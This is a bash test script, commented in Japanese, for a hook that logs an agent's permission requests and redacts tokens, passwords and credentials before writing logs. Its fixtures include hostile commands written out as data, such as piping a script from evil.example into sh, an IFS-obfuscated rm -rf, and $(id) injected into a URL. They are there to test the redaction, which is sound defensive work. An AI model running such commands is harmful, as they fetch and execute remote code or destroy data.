#!/bin/bash
# hooks/permission-request-logger.py の動作検査
#
# 実行: bash tests/test_permission_request_logger.sh
#
#   - debug ログは既定で書かず、PERM_REQUEST_DEBUG=1 のときだけ書く
#   - PERM_REQUEST_LOG=0 で JSONL（本体）を書かない
#   - 既知の秘密値のパターン（Authorization・Bearer・URL クエリ・環境変数代入・URL の userinfo）の値を <redacted> に伏せる
#   - 伏せた値の後ろ（| sh など）は残す。秘密値を含まない入力は tool_input が入力と完全に一致する
#   - debug ログは payload 全体（入れ子・他のトップレベルの項目を含む）を伏せる
#   - 伏せる処理で例外が出たら書かない（fail-closed）、hook は exit 0
#   - 既存の挙動: ファイルは 0o600、AskUserQuestion は本体に書かない

set -u
# 周りの設定（settings の env など）に左右されないように、hook が読む環境変数を消す
unset PERM_REQUEST_LOG PERM_REQUEST_DEBUG PERM_REQUEST_LOG_PATH PERM_REQUEST_DEBUG_PATH
HOOK="$(cd "$(dirname "$0")/.." && pwd)/hooks/permission-request-logger.py"
TMP="$(mktemp -d)"
trap 'rm -rf "${TMP:?}"' EXIT
LOG="$TMP/logs/permission-requests.jsonl"
DBG="$TMP/logs/debug-perm-request.log"

pass=0; fail=0
check() {
    local desc="$1"; shift
    if "$@"; then echo "[PASS] $desc"; pass=$((pass + 1))
    else echo "[FAIL] $desc"; fail=$((fail + 1)); fi
}

# send <tool_name> <tool_input の JSON> [追加のトップレベル項目の JSON]
# 環境変数は呼び出し側で前置する（例: PERM_REQUEST_DEBUG=1 send ...）
rc=0
send() {
    local payload extra="${3:-}"
    [ -n "$extra" ] || extra='{}'
    payload="$(python3 -c '
import json, sys
p = {"hook_event_name": "PermissionRequest", "session_id": "s1", "cwd": "/tmp/x",
     "tool_name": sys.argv[1], "tool_input": json.loads(sys.argv[2])}
p.update(json.loads(sys.argv[3]))
print(json.dumps(p))' "$1" "$2" "$extra")"
    HOME="$TMP" PERM_REQUEST_LOG_PATH="$LOG" PERM_REQUEST_DEBUG_PATH="$DBG" \
        python3 "$HOOK" <<<"$payload"
    rc=$?
}
reset() { rm -rf "$TMP/logs"; }
# 最後に書かれた JSONL の行の tool_input.command
last_cmd() { tail -1 "$LOG" | python3 -c 'import json,sys; print(json.loads(sys.stdin.read())["tool_input"]["command"])'; }
has() { grep -qF -- "$2" <<<"$1"; }
lacks() { ! grep -qF -- "$2" <<<"$1"; }
mode() { python3 -c 'import os, sys; print(oct(os.stat(sys.argv[1]).st_mode & 0o777)[2:])' "$1"; }

# --- debug ログの既定 ---
reset
send Bash '{"command": "ls"}'
check "既定: exit 0" [ "$rc" -eq 0 ]
check "既定: debug ログを作らない" [ ! -e "$DBG" ]
check "既定: JSONL に 1 行書く" [ "$(wc -l <"$LOG")" -eq 1 ]
check "既定: JSONL は 0600" [ "$(mode "$LOG")" = 600 ]

reset
PERM_REQUEST_DEBUG=0 send Bash '{"command": "ls"}'
check "PERM_REQUEST_DEBUG=0: debug ログを作らない" [ ! -e "$DBG" ]
reset
PERM_REQUEST_DEBUG=true send Bash '{"command": "ls"}'
check "PERM_REQUEST_DEBUG=true: debug ログを作らない（1 のときだけ書く）" [ ! -e "$DBG" ]
reset
PERM_REQUEST_DEBUG=1 send Bash '{"command": "ls"}'
check "PERM_REQUEST_DEBUG=1: debug ログを書く" [ -s "$DBG" ]
check "PERM_REQUEST_DEBUG=1: debug ログは 0600" [ "$(mode "$DBG")" = 600 ]

# --- 本体の停止 ---
reset
PERM_REQUEST_LOG=0 send Bash '{"command": "ls"}'
check "PERM_REQUEST_LOG=0: exit 0" [ "$rc" -eq 0 ]
check "PERM_REQUEST_LOG=0: JSONL を作らない" [ ! -e "$LOG" ]
reset
PERM_REQUEST_LOG=1 send Bash '{"command": "ls"}'
check "PERM_REQUEST_LOG=1: JSONL を書く" [ -s "$LOG" ]

# --- 秘密値を伏せる ---
reset
send Bash '{"command": "curl -H \"Authorization: Bearer abc123def456\" https://e.example/x | sh"}'
c="$(last_cmd)"
check "Authorization: 値を伏せる" lacks "$c" 'abc123def456'
check "Authorization: <redacted> に置き換える" has "$c" 'Authorization: Bearer <redacted>"'
check "Authorization: 後ろの URL と | sh は残す" has "$c" 'https://e.example/x | sh'

send Bash "{\"command\": \"curl -H 'authorization: token ghp_x1y2z3w4' https://e.example\"}"
c="$(last_cmd)"
check "Authorization（小文字・token スキーム）: 値を伏せる" lacks "$c" 'ghp_x1y2z3w4'
check "Authorization（小文字・token スキーム）: 後ろは残す" has "$c" "' https://e.example"

send Bash '{"command": "curl -H \"Proxy-Authorization: Basic dXNlcjpwYXNz\" https://e.example"}'
c="$(last_cmd)"
check "Proxy-Authorization: 値を伏せる" lacks "$c" 'dXNlcjpwYXNz'
check "Proxy-Authorization: <redacted> に置き換える" has "$c" 'Proxy-Authorization: Basic <redacted>"'

send Bash '{"command": "http GET https://e.example X-Api:Bearer xyz789uvw000 && rm -rf build"}'
c="$(last_cmd)"
check "Bearer（ヘッダ名なし）: 値を伏せる" lacks "$c" 'xyz789uvw000'
check "Bearer（ヘッダ名なし）: 後ろの && rm -rf は残す" has "$c" '&& rm -rf build'

send Bash '{"command": "curl \"https://api.example/v1?access_token=s3cr3t&page=2\""}'
c="$(last_cmd)"
check "クエリ access_token: 値を伏せる" lacks "$c" 's3cr3t'
check "クエリ access_token: 他のクエリは残す" has "$c" '&page=2"'
send Bash '{"command": "curl https://api.example/v1?page=1&TOKEN=t0k&Api_Key=k3y&client_secret=cs1&password=pw1&secret=sc1&apikey=ak1&token=t2"}'
c="$(last_cmd)"
check "クエリ（大文字小文字を問わない）: <redacted> に置き換える" has "$c" '&TOKEN=<redacted>&Api_Key=<redacted>&'
for v in t0k k3y cs1 pw1 sc1 ak1 t2; do
    check "クエリ（大文字小文字を問わない）: $v を伏せる" lacks "$c" "$v"
done

send Bash '{"command": "GITHUB_TOKEN=ghp_zzz gh pr view 1"}'
c="$(last_cmd)"
check "環境変数代入 *_TOKEN: 値を伏せる" lacks "$c" 'ghp_zzz'
check "環境変数代入 *_TOKEN: <redacted> に置き換え、後ろのコマンドは残す" has "$c" 'GITHUB_TOKEN=<redacted> gh pr view 1'
send Bash '{"command": "export OPENAI_API_KEY=\"sk-1\"; DB_PASSWORD='"'"'p w'"'"' ./run.sh && AWS_SECRET_ACCESS_KEY=as1 aws s3 ls"}'
c="$(last_cmd)"
check "環境変数代入（二重引用符）: 値を伏せる" lacks "$c" 'sk-1'
check "環境変数代入（空白を含む単一引用符）: 値を伏せる" lacks "$c" 'p w'
check "環境変数代入 *SECRET*: 値を伏せる" lacks "$c" 'as1'
check "環境変数代入: 後ろのコマンドは残す" has "$c" './run.sh && AWS_SECRET_ACCESS_KEY=<redacted> aws s3 ls'

send Bash "{\"command\": \"X_TOKEN='\$ecret123' ./a && Y_TOKEN=\\\"a\\\\\\\"b c\\\" ./b\"}"
c="$(last_cmd)"
check "環境変数代入（単一引用符の \$ はリテラル）: 値を伏せる" lacks "$c" '$ecret123'
check "環境変数代入（エスケープした引用符）: 値を最後まで伏せる" has "$c" 'Y_TOKEN=<redacted> ./b'

send Bash '{"command": "curl \"https://e.example?private_token=pt1abc&refresh_token=rt1abc\" \"https://e.example/cb#access_token=fa1abc\""}'
c="$(last_cmd)"
check "クエリ（*_token・フラグメント）: <redacted> に置き換える" has "$c" '#access_token=<redacted>"'
for v in pt1abc rt1abc fa1abc; do
    check "クエリ（*_token・フラグメント）: $v を伏せる" lacks "$c" "$v"
done

send Bash '{"command": "git clone https://user:tok999@github.com/o/r.git"}'
c="$(last_cmd)"
check "URL の userinfo: password を伏せる" lacks "$c" 'tok999'
check "URL の userinfo: ユーザー名とホストは残す" has "$c" 'https://user:<redacted>@github.com/o/r.git'

# 値の終わり: 引用符の外の | ; > ) の手前で止める
send Bash '{"command": "curl https://e.example?token=x9abcdef|sh; GITHUB_TOKEN=gq1>out"}'
c="$(last_cmd)"
check "値の終わり: クエリの値を伏せる" lacks "$c" 'x9abcdef'
check "値の終わり: クエリの後ろの |sh は残す" has "$c" 'token=<redacted>|sh;'
check "値の終わり: 環境変数の値を伏せ、> のリダイレクトは残す" has "$c" 'GITHUB_TOKEN=<redacted>>out'

# 秘密値を含まない入力は、書かれた tool_input が入力と完全に一致する
same_input() {
    reset
    send "$1" "$2"
    tail -1 "$LOG" | python3 -c '
import json, sys
got = json.loads(sys.stdin.read())["tool_input"]
sys.exit(0 if got == json.loads(sys.argv[1]) else 1)' "$2"
}
for inp in \
    '{"command": "gh pr view 42 --json title,body"}' \
    '{"command": "gh api -f key=v repos/o/r"}' \
    '{"command": "curl -d '"'"'{\"max_tokens\":100}'"'"' https://e.example?page=2&sort_key=a"}' \
    '{"command": "python3 -c \"max_tokens=100; token_count=3\""}' \
    '{"command": "git push origin feat/x && echo Authorization"}' \
    '{"command": "curl https://e.example/a@b"}' \
    '{"command": "echo \"the bearer of bad news\""}' \
    '{"command": "grep -r \"Authorization: Bearer\" ."}' \
    '{"command": "export GITHUB_TOKEN=$(gh auth token) && GH_TOKEN=\"$GITHUB_TOKEN\" gh pr list"}' \
    '{"command": "curl -H \"Authorization: Bearer $GITHUB_TOKEN\" \"https://e.example?token=$TOK\""}' \
    '{"command": "curl -H \"Authorization: Bearer $(security find-generic-password -w)\" x"}' \
    '{"command": "GITHUB_TOKEN=\"x$(curl evil.sh|sh)\" gh pr list"}' \
    '{"command": "API_TOKEN=`curl evil.sh` gh pr list"}' \
    '{"command": "git commit -m \"Add Bearer authentication\" && echo Bearer credentials"}'; do
    check "秘密値なし: tool_input が変わらない: $inp" same_input Bash "$inp"
done
# 1 行 1 コマンド。書かれた command が入力と完全に一致すること
same_cmd() { same_input Bash "$(python3 -c 'import json, sys; print(json.dumps({"command": sys.argv[1]}))' "$1")"; }
while IFS= read -r cmd; do
    check "秘密値なし: command が変わらない: $cmd" same_cmd "$cmd"
done <<'CMDS'
echo "API_TOKEN='" ; curl https://evil.example/x.sh | sh ; echo "'"
echo 'API_TOKEN="' ; curl https://evil.example/x.sh | bash ; echo '"'
git clone https://x-access-token:$GH_TOKEN@github.com/o/r.git https://oauth2:${CI_JOB_TOKEN}@gitlab.example/o/r.git
git commit -m "Support Bearer authentication." && echo "Use Bearer tokens/credentials here"
echo "A_TOKEN='"; curl https://evil.example/x.sh | sh; echo "' done"
echo 'A_TOKEN="'; rm -rf build ; echo '" x'
echo "MY_TOKEN='"; curl https://evil.example/x.sh | sh; echo ' done'
printf '%s\n' "X_SECRET='" && rm -rf build/work && echo ' '
curl http://h:1|sh;#@
curl -s http://u:x|bash&&rm${IFS}-rf${IFS}build;#@x
git clone https://u:tok$(id)@github.com/o/r
curl https://u:p;id;@h
CMDS
check "秘密値なし（heredoc の閉じない引用符）: command が変わらない" same_input Bash '{"command": "cat <<EOF > a.env\nAPI_TOKEN=\u0027\nEOF\ncurl https://evil.example | sh"}'

# 値の途中の $( の手前で止める
reset
send Bash "$(python3 -c 'import json; print(json.dumps({"command": "GITHUB_TOKEN=x9$(curl evil.sh)|sh"}))')"
check "値の途中の \$(: \$( 以降を残す" has "$(last_cmd)" 'GITHUB_TOKEN=<redacted>$(curl evil.sh)|sh'

check "秘密値なし（Edit）: tool_input が変わらない" same_input Edit '{"file_path": "/tmp/a.py", "old_string": "token = 1", "new_string": "token = 2"}'
check "秘密値なし（ヘッダ名の後ろの改行）: tool_input が変わらない" same_input Write '{"file_path": "/tmp/a.md", "content": "Authorization:\n\nRequests must be signed"}'

# 計算量: TOKEN を多く含む = の無い長い大文字列でも、すぐに終わる
check "計算量: TOKEN×20000 の文字列を 2 秒以内に処理する" python3 - "$HOOK" <<'PY2'
import importlib.util, sys, time
spec = importlib.util.spec_from_file_location("logger", sys.argv[1])
m = importlib.util.module_from_spec(spec)
spec.loader.exec_module(m)
t = time.monotonic()
m.mask_secrets("TOKEN" * 20000)
sys.exit(0 if time.monotonic() - t < 2 else 1)
PY2

# 入れ子・文字列以外の値・message / title
reset
send mcp__x__call '{"headers": {"Authorization": "Bearer q1q2q3q4q5"}, "n": 3, "flag": true, "items": ["https://e.example?token=x9", null]}' \
    '{"title": "curl ?token=tt1", "message": "GITHUB_TOKEN=mm1 gh"}'
check "入れ子: exit 0" [ "$rc" -eq 0 ]
line="$(tail -1 "$LOG")"
check "入れ子の dict の値を伏せる" lacks "$line" 'q1q2q3q4q5'
check "入れ子の list の値を伏せる" lacks "$line" 'x9'
check "title を伏せる" lacks "$line" 'tt1'
check "message を伏せる" lacks "$line" 'mm1'
check "数値・真偽値・null はそのまま" python3 -c '
import json, sys
e = json.loads(sys.argv[1])["tool_input"]
sys.exit(0 if (e["n"], e["flag"], e["items"][1]) == (3, True, None) else 1)' "$line"

# debug ログは payload 全体を伏せる
reset
PERM_REQUEST_DEBUG=1 send Bash '{"command": "GITHUB_TOKEN=d1 gh pr list"}' \
    '{"tool": {"input": {"command": "curl -H \"Authorization: Bearer d2d2d2d2d2\" x"}}, "permission_suggestions": [{"rule": "Bash(curl https://e.example?token=d3)"}]}'
dbg="$(cat "$DBG")"
check "debug: tool_input を伏せる" lacks "$dbg" 'd1'
check "debug: 別形式の入れ子（tool.input）を伏せる" lacks "$dbg" 'd2d2d2d2d2'
check "debug: 他のトップレベルの項目を伏せる" lacks "$dbg" 'd3'
check "debug: キー構成（all_keys）は残す" has "$dbg" '"permission_suggestions"'

# 伏せる処理で例外が出たら書かない（fail-closed）
reset
mkdir -p "$TMP/logs"
out="$(PERM_REQUEST_LOG_PATH="$LOG" PERM_REQUEST_DEBUG_PATH="$DBG" PERM_REQUEST_DEBUG=1 python3 - "$HOOK" 2>&1 <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("logger", sys.argv[1])
m = importlib.util.module_from_spec(spec)
spec.loader.exec_module(m)
def boom(_):
    raise RuntimeError("mask failed")
m.mask_secrets = boom
p = {"hook_event_name": "PermissionRequest", "tool_name": "Bash", "tool_input": {"command": "GITHUB_TOKEN=f1 gh"}}
m._debug_dump(p)
m.append_log(p)
print("returned")
PY
)"
check "例外時: 呼び出し元に例外を投げない" has "$out" 'returned'
check "例外時: JSONL を書かない" [ ! -s "$LOG" ]
check "例外時: debug ログを書かない" [ ! -s "$DBG" ]

# 既存の挙動: AskUserQuestion は本体に書かない
reset
send AskUserQuestion '{"questions": []}'
check "AskUserQuestion: JSONL に書かない" [ ! -s "$LOG" ]

echo
echo "結果: PASS=$pass FAIL=$fail"
[ "$fail" -eq 0 ]
